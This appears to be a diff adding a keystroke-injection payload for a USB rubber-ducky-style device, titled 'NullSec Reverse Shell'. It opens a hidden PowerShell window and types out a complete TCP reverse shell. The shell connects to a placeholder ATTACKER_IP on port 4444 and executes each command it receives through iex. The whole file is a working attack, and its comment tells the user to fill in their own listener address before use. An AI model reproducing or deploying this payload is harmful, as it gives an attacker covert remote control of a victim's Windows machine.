@@ -1,0 +1,36 @@
+REM NullSec Reverse Shell
+REM Edit LHOST and LPORT before use
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden
+ENTER
+DELAY 1000
+
+STRING $LHOST = "ATTACKER_IP"
+ENTER
+STRING $LPORT = "4444"
+ENTER
+STRING $client = New-Object System.Net.Sockets.TCPClient($LHOST,$LPORT)
+ENTER
+STRING $stream = $client.GetStream()
+ENTER
+STRING [byte[]]$bytes = 0..65535|%{0}
+ENTER
+STRING while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+ENTER
+STRING $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+ENTER
+STRING $sendback = (iex $data 2>&1 | Out-String )
+ENTER
+STRING $sendback2 = $sendback + "PS " + (pwd).Path + "> "
+ENTER
+STRING $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+ENTER
+STRING $stream.Write($sendbyte,0,$sendbyte.Length)
+ENTER
+STRING $stream.Flush()}
+ENTER
+STRING $client.Close()
+ENTER
